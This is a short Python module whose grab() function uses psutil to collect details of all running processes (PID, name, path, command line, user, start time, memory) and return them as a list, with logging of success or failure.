# modules/running_processes.py - Capture running processes

import psutil
from datetime import datetime
from config import log

def grab():
    """Capture all running processes with details"""
    log("Capturing running processes...")
    
    processes = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'username', 'create_time', 'memory_info']):
            try:
                info = proc.info
                
                # Get memory usage in MB
                mem_mb = info['memory_info'].rss / (1024 * 1024) if info['memory_info'] else 0
                
                # Get creation time
                create_time = datetime.fromtimestamp(info['create_time']).strftime('%Y-%m-%d %H:%M:%S') if info['create_time'] else 'N/A'
                
                process_data = {
                    'pid': info['pid'],
                    'name': info['name'],
                    'exe': info['exe'] if info['exe'] else 'N/A',
                    'cmdline': ' '.join(info['cmdline']) if info['cmdline'] else 'N/A',
                    'username': info['username'] if info['username'] else 'N/A',
                    'created': create_time,
                    'memory_mb': round(mem_mb, 2)
                }
                
                processes.append(process_data)
            
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
    
    except Exception as e:
        log(f"Failed to capture processes: {e}")
        return None
    
    if processes:
        log(f"Captured {len(processes)} running processes")
        return processes
    
    log("No processes captured")
    return None